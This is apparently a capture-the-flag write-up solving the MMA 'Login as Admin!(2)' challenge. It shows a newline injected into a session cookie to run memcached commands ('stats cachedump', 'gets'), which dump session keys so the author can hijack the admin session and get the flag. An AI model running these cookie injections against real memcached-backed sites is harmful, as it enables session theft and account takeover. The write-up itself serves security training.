# MMA : Login as Admin!(2)

#### Author: Wh1t3Fox

**Description**:
> Login as Admin!
>
> http://login2.chal.mmactf.link
>
> You can use test:test account.

After playing around on the website and with different parameters I noticed that when changing the cookie
to be *%0a* to test for memcached injection and the site would dumped a *MemcacheError:ERROR ERROR*.
This is awesome so we know that there is a memcached server running on the backend.

After searching online I found a memcached server cheat sheet located at http://lzone.de/cheat-sheet/memcached

There was a command:

    stats cachedump <slab class> <number of items to dump>

So I tried to dump some of the classes starting at 0 and going up. Setting the cookie to:

    Cookie: %0astats cachedump 0 0

    MemcacheError:ERROR END

Then I tried:

    Cookie: %0astats cachedump 1 0

    MemcacheError:ERROR ITEM key [1 b; 1441762228 s] ITEM 12345 [20 b; 1441494967 s] END

So it looks like I'm on the right track maybe? I continued to increase and at slab class 3 is where the fun began.

    Cookie: %0astats cachedump 3 0

    MemcacheError:ERROR
    ITEM 3f063d8659f0f08c4454554294aca59bbe42cc6e11db23eb69f5a1c0a9486aa1 [19 b; 1442016274 s]
    ITEM 0e9d0aecea498b15ee63d38dd4664dcfc75be0846ec4baee931b45a04462eeab [20 b; 1441494967 s]
    ITEM 09cf27be606344f29bda74bd7c035e6d862c95025a2a6bb1785c8883ae65b18a [16 b; 1441494967 s]
    ITEM b33542ed3c8bf5c2c346e26aac28a10055fa6a50c4948873810798e9f4cfca98 [20 b; 1441494967 s]
    ITEM e391306f6481940ab3c796eb1253435b06e9a9357227de734b0ec3f58bd14d7f [19 b; 1442011213 s]
    ITEM c706b288065ad5c29153d8773c3e3be6e8a07408cdf4e0e40e97917896e43839 [19 b; 1442012877 s]
    ITEM a5e754e6e804bf7e49f8096242a6566cc337b06aa6c2dafda3f86edccf8cb4b3 [19 b; 1442011191 s]
    ITEM edf938c33d05ff9f8696415d5ef817014a5cc2906abe24576fdafe8ae58dde48 [19 b; 1442010879 s]
    ITEM 5f7d07e310e9fad574d0975741a9c05d0d75d7157ce9bb9546b7f58d940cee7a [19 b; 1442006048 s]
    ITEM 3d1a32800a501fe7387287ba4631ae9318206ef96083a29f35fd1ef42f7a85c5 [19 b; 1441998916 s]
    ...

Noticing that **most** of the sizes were 19b except a few, thanks to Daniele, I focuses on the 20b and use the key to see what the value was.

    Cookie: %0agets 0e9d0aecea498b15ee63d38dd4664dcfc75be0846ec4baee931b45a04462eeab

    MemcacheError:ERROR VALUE 0e9d0aecea498b15ee63d38dd4664dcfc75be0846ec4baee931b45a04462eeab 0 20 56850 {"username":"admin"} END

Yes! So we just found an entry the admin used when logging in. From there I tried this key as my cookie value.

    Cookie: 0e9d0aecea498b15ee63d38dd4664dcfc75be0846ec4baee931b45a04462eeab

    Flag is "MMA{61016d84e70e0b5ed5c03e4e398c3571}"
